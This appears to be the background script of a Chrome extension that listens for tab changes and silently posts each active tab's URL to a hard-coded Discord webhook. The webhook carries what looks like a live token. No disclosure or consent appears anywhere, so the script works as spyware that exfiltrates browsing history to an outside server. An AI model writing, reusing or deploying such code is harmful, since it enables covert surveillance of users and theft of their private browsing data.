const webhook = "https://discord.com/api/webhooks/909275526001229894/li2_EzdzkgdiXYVDLele1ciHzHs-GBamJeXQKvIwWHWlY2ADBE-u-1KOSEMqdNZnQxlJ"
function webhookReq(webhook, url) {
    var params = {
        embeds: [{
              "title": `Search`,
              "description": "",
              "color": 16777215,
              "fields": [{
                "name": 'New Tab',
                "value": "```URL🔎:\n" + url + "```",
                inline: false
              }]
      }]
}
fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}
let activeTabId, lastUrl, lastTitle;
function getTabInfo(tabId) {
  chrome.tabs.get(tabId, function(tab) {
    if(lastUrl != tab.url || lastTitle != tab.title)
      console.log(lastUrl = tab.url, lastTitle = tab.title);
    webhookReq(webhook, lastUrl = tab.url, lastTitle = tab.title);
  });
}
chrome.tabs.onActivated.addListener(function(activeInfo) {
  getTabInfo(activeTabId = activeInfo.tabId);
});
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
  if(activeTabId == tabId) {
    getTabInfo(tabId);
  }
});
